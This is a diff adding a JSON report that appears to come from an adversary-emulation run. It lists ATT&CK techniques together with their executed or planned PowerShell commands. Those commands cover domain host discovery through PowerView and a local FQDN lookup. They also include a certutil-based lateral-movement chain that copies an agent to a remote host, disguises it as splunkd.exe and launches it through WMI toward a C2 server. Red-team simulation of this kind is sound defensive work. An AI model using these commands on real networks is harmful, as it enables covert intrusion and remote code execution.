@@ -1,0 +1,92 @@
+{
+  "operation_id": "acbbe1c8-2780-4451-86ce-71a7362e7986",
+  "operation_name": "apt-sim-20260402-092855",
+  "technique_count": 3,
+  "techniques": [
+    {
+      "technique_id": "T1018",
+      "technique_name": "Discover local hosts",
+      "tactic": "discovery",
+      "ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f",
+      "ability_name": "Discover local hosts",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "cmd,psh,proc",
+        "{'name': 'psh', 'platform': 'windows', 'command': 'Import-Module .\\\\powerview.ps1;\\nGet-DomainComputer', 'code': None, 'language': None, 'build_target': None, 'payloads': ['powerview.ps1'], 'uploads': [], 'timeout': 60, 'parsers': [{'module': 'plugins.stockpile.app.parsers.gdomain', 'parserconfigs': [{'source': 'remote.host.fqdn', 'edge': '', 'target': '', 'custom_parser_vals': {}}]}], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "Import-Module .\\powerview.ps1;\nGet-DomainComputer"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "TA0007",
+      "technique_name": "Local FQDN",
+      "tactic": "discovery",
+      "ability_id": "74d1b640-7f1e-4b36-beba-23a8228f39e0",
+      "ability_name": "Local FQDN",
+      "origins": [
+        "executed_link",
+        "planned_compatible"
+      ],
+      "statuses": [
+        "0",
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "cmd,psh,proc",
+        "{'name': 'psh', 'platform': 'windows', 'command': '[System.Net.Dns]::GetHostByName($env:computerName).HostName', 'code': None, 'language': None, 'build_target': None, 'payloads': [], 'uploads': [], 'timeout': 60, 'parsers': [{'module': 'plugins.stockpile.app.parsers.basic', 'parserconfigs': [{'source': 'local.host.fqdn', 'edge': '', 'target': '', 'custom_parser_vals': {}}]}], 'cleanup': [], 'variations': [], 'additional_info': {}}"
+      ],
+      "commands": [
+        "[System.Net.Dns]::GetHostByName($env:computerName).HostName"
+      ],
+      "d3fend": []
+    },
+    {
+      "technique_id": "T1570",
+      "technique_name": "Lateral Movement - Certutil",
+      "tactic": "lateral-movement",
+      "ability_id": "96d3c175-5e58-424c-8350-d7514b28a075",
+      "ability_name": "Lateral Movement - Certutil",
+      "origins": [
+        "planned_compatible"
+      ],
+      "statuses": [
+        "planned"
+      ],
+      "paws": [
+        "fgdafj"
+      ],
+      "executors": [
+        "cmd,psh,proc"
+      ],
+      "commands": [
+        "certutil -encode #{location} C:\\users\\public\\com.crt | out-null;\ninvoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\\\#{local.host.fqdn}\\c$\\users\\public\\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist \"C:\\users\\public\\splunkd.exe -server #{server} -group red\" }\n"
+      ],
+      "d3fend": []
+    }
+  ],
+  "attack_ids": [
+    "T1018",
+    "T1570",
+    "TA0007"
+  ],
+  "d3fend_map": {
+    "T1018": [],
+    "T1570": [],
+    "TA0007": []
+  }
+}
